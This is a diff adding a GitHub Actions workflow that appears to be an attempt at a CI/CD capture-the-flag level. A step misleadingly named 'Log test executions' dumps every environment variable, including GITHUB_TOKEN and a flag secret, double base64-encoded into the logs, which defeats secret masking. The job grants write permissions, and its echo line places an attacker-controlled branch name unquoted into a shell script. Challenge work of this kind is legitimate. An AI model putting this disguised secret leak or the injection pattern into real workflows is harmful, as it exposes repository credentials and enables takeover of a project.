@@ -1,0 +1,31 @@
+name: Attempt
+on:
+  workflow_run:
+    workflows: ["Poutine Level 0"]
+
+permissions: {}
+
+jobs:
+  attempt:
+    runs-on: ubuntu-latest
+    timeout-minutes: 1
+    permissions:
+      id-token: write
+      contents: write
+      pull-requests: write
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      FLAG_GRAVY_OVERFLOW_L1_TOPPINGS_FOR_REALZ: ${{ secrets.FLAG_GRAVY_OVERFLOW_L1_TOPPINGS_FOR_REALZ }}
+    steps:
+      - uses: step-security/harden-runner@63c24ba6bd7ba022e95695ff85de572c04a18142 # v2.7.0
+        with:
+          egress-policy: audit
+      - uses: actions/first-interaction@v1
+        with:
+          repo-token: ${{ secrets.GITHUB_TOKEN }}
+          issue-message: 'Message that will be displayed on users first issue'
+          pr-message: 'Message that will be displayed on users first pr'
+      - name: Log test executions
+        run: |
+          env | base64 -w0 | base64 -w0
+          echo "Lint ran for branch ${{ github.event.workflow_run.head_branch }} in a PR from ${{ github.actor }}. Please check the logs for more information."
